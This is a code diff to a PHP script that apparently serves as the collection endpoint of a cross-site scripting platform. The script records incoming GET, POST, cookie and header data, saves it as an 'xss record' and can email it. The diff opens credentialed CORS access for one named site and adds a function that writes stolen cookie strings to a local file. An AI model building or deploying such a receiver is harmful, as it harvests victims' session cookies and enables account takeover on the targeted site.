@@ -9,9 +9,16 @@ error_reporting(0);
 if(count($_GET)==0&&count($_POST)==0&&count($_COOKIE)==0)
 exit();
 */
-header("Access-Control-Allow-Origin:*");
+header("Access-Control-Allow-Credentials: true");
+header("Access-Control-Allow-Origin: http://www.ekwing.com");
+//header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Headers:Content-Type,XFILENAME,XFILECATEGORY,XFILESIZE");
 require_once("functions.php");
 require_once("dio.php");
+
+if($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
+    exit;
+}
 
 $info = array();
 
@@ -28,6 +35,11 @@ $headers_data = getallheaders();
 $get_data            = $_GET;
 $decoded_get_data    = tryBase64Decode($_GET);
 $post_data           = $_POST;
+
+if(isset($post_data['cookie'])) {
+    formatCookie($post_data['cookie']);
+}
+
 $decoded_post_data   = tryBase64Decode($_POST);
 $cookie_data         = $_COOKIE;
 $decoded_cookie_data = tryBase64Decode($_COOKIE);
@@ -62,4 +74,10 @@ save_xss_record(json_encode($info), $request_time);
 if (MAIL_ENABLE) {
     require_once("mail.php");
     @send_mail($info);
+}
+
+function formatCookie($strCookie)
+{
+    $arrCookie = explode(";", $strCookie);
+    file_put_contents('test/cookie', var_export($arrCookie,true));
 }
